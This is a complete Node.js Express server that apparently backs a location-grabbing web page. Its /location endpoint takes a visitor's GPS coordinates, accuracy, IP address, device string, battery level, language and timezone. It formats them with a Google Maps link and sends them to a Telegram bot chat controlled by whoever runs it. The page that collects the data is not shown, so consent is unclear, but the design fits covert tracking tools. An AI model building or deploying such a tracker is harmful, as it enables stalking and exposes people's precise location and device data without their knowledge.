require("dotenv").config();

const express = require("express");
const path = require("path");
const axios = require("axios");

const app = express();

app.use(express.json({ limit: "1mb" }));
app.use(express.static(path.join(__dirname, "public")));

app.post("/location", async (req, res) => {
  try {
    const data = req.body;
    const gps = data.gps || {};

    const ip =
      req.headers["x-forwarded-for"]?.toString().split(",")[0] ||
      req.socket.remoteAddress ||
      "N/A";

    const maps =
      gps.ok && gps.lat && gps.lon
        ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}`
        : "No disponible";

    const mensaje = `
📍 NUEVO REGISTRO DE UBICACIÓN

🕒 Fecha:
${new Date().toLocaleString("es-CO")}

🌐 IP:
${ip}

📌 Latitud:
${gps.lat ?? "N/A"}

📌 Longitud:
${gps.lon ?? "N/A"}

🎯 Precisión:
${gps.acc ?? "N/A"} m

🗺 Google Maps:
${maps}

📱 Dispositivo:
${data.ua ?? "N/A"}

🔋 Batería:
${data.battery?.level ?? "N/A"}%

🌎 Idioma:
${data.language ?? "N/A"}

🕐 Zona horaria:
${data.timezone ?? "N/A"}
`;

    await axios.post(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text: mensaje,
      }
    );

    res.json({
      ok: true,
      maps,
    });
  } catch (error) {
    console.error(error.response?.data || error.message);

    res.status(500).json({
      ok: false,
      msg: error.response?.data || error.message,
    });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Servidor iniciado en puerto ${PORT}`);
});